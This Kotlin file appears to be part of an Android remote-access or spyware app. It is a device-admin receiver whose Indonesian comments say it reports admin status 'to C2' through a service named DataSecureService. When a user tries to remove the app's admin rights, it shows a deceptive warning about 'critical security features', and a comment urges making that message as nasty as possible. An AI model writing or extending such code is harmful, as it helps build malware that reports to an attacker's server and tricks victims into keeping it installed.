package com.sadap.bocahapp.receivers

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import android.widget.Toast
import android.util.Log
import com.sadap.bocahapp.services.DataSecureService

class AdminReceiver : DeviceAdminReceiver() {

    override fun onEnabled(context: Context, intent: Intent) {
        Toast.makeText(context, "Admin perangkat diaktifkan", Toast.LENGTH_SHORT).show()
        Log.d("AdminReceiver", "Device Admin Enabled.")
        // Update status ke C2 melalui DataSecureService
        val serviceIntent = Intent(context, DataSecureService::class.java)
        serviceIntent.putExtra("action", "UPDATE_ADMIN_STATUS")
        context.startService(serviceIntent)
    }

    override fun onDisabled(context: Context, intent: Intent) {
        Toast.makeText(context, "Admin perangkat dinonaktifkan", Toast.LENGTH_SHORT).show()
        Log.d("AdminReceiver", "Device Admin Disabled.")
        // Update status ke C2 melalui DataSecureService
        val serviceIntent = Intent(context, DataSecureService::class.java)
        serviceIntent.putExtra("action", "UPDATE_ADMIN_STATUS")
        context.startService(serviceIntent)
    }

    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        // Ini adalah pesan peringatan yang akan ditampilkan saat pengguna mencoba menonaktifkan Device Admin.
        // Lo bisa bikin pesannya semenjijikkan mungkin!
        val msg = "Peringatan! Menonaktifkan admin perangkat akan mengganggu fitur keamanan kritis. Anda yakin?"
        Log.w("AdminReceiver", "Device Admin Disable Requested.")
        return msg
    }
}
